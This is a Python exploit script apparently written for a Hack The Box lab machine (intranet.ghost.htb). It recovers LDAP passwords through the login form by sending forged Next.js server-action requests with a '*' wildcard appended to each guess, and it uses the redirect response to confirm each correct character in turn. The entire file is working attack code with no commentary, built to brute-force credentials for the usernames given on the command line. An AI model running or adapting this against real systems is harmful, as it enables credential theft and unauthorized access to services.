import sys
import random, string
import requests
from requests_toolbelt import MultipartEncoder
from colorama import Fore, Style

url = "http://intranet.ghost.htb:8008/login"
charset = string.ascii_letters + string.digits + '_@{}-/!"$%^[]:;'

def authenticate(username, password):
	boundary = f"------WebKitFormBoundary{''.join(random.sample(string.ascii_letters + string.digits, 16))}"

	fields = {
		"1_ldap-username": username,
		"1_ldap-secret": password,
		"0": '[{},"$K1"]'
	}

	data = MultipartEncoder(fields=fields, boundary=boundary)
	headers = {
		"Content-Type": data.content_type,
		"Next-Action": "c471eb076ccac91d6f828b671795550fd5925940"
	}

	r = requests.post(url, data=data, headers=headers)

	if r.status_code == 303:
		return True
	else:
		return False

def brute(username):
	print(Fore.BLUE + f"[*] Brute-forcing password for {username}..." + Style.RESET_ALL)

	value = ""
	finish = False
	while not finish:
		for c in charset:
			p = value + str(c)
			print(Fore.BLUE + f"\r[*] Testing value: {p}" + Style.RESET_ALL, end='')
			valid = authenticate(username, p + "*")

			if valid:
				value += str(c)
				break

			if c == charset[-1]:
				finish = True
				print()

	print(Fore.GREEN + f"[+] Password for {username} found: {value}" + Style.RESET_ALL)

def main():
	if len(sys.argv) < 2:
		print(f"Usage: python3 {sys.argv[0]} <user1> <user2> ...")
		exit(0)

	for user in sys.argv[1:]:
		brute(user)

if __name__ == "__main__":
	main()